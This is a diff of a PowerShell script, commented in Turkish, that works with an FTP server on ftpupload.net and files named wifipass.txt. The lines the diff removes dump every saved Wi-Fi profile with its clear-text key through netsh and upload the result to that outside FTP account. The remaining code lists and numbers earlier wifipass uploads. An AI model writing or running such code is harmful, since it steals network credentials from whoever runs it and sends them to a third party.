@@ -1,5 +1,5 @@
 # FTP bilgileri
-$ftpHost = "ftp://ftpupload.net/htdocs/"   # Buraya dikkat, sonuna "htdocs/" eklendi
+$ftpHost = "ftp://ftpupload.net/"
 $ftpUser = "if0_39536575"
 $ftpPass = $env:FTP_PASS
 
@@ -8,6 +8,7 @@ if (-not $ftpPass) {
     exit 1
 }
 
+# FTP'den dosya listesini al
 try {
     $ftpRequest = [System.Net.FtpWebRequest]::Create($ftpHost)
     $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectory
@@ -22,14 +23,16 @@ try {
     $reader.Close()
     $response.Close()
 
-    Write-Host "FTP htdocs Dosya Listesi:"
+    Write-Host "FTP Dosya Listesi:"
     $fileList | ForEach-Object { Write-Host " - $_" }
 
+    # wifipass dosyalarını filtrele
     $existingFiles = $fileList | Where-Object { $_ -match '^wifipass(\d*)\.txt$' }
 
     Write-Host "`nBulunan wifipass dosyaları:"
     $existingFiles | ForEach-Object { Write-Host " * $_" }
 
+    # Dosya numaralarını çıkar
     $numbers = $existingFiles | ForEach-Object {
         if ($_ -match '^wifipass(\d+)\.txt$') {
             [int]$matches[1]
@@ -42,23 +45,12 @@ try {
 
     $maxNum = if ($numbers.Count -gt 0) { ($numbers | Measure-Object -Maximum).Maximum } else { 0 }
 
+    # Yeni dosya adı
     $newFileName = if ($maxNum -eq 0) { "wifipass.txt" } else { "wifipass$($maxNum + 1).txt" }
 
     Write-Host "`nYeni dosya adı: $newFileName"
 
-    # Wi-Fi şifrelerini dosyaya yaz
-    $localFilePath = "$env:USERPROFILE\$newFileName"
-    netsh wlan show profile name="*" key=clear > $localFilePath
-
-    # FTP'ye yükleme URL'si (htdocs içine)
-    $ftpUploadUrl = $ftpHost + $newFileName
-
-    $webclient = New-Object System.Net.WebClient
-    $webclient.Credentials = New-Object System.Net.NetworkCredential($ftpUser, $ftpPass)
-
-    $webclient.UploadFile($ftpUploadUrl, "STOR", $localFilePath)
-    Write-Host "$newFileName dosyası FTP htdocs klasörüne başarıyla yüklendi."
-
 } catch {
-    Write-Error "FTP işlemi sırasında hata oluştu: $_"
+    Write-Error "FTP dosya listesi alınırken hata: $_"
+    exit 1
 }
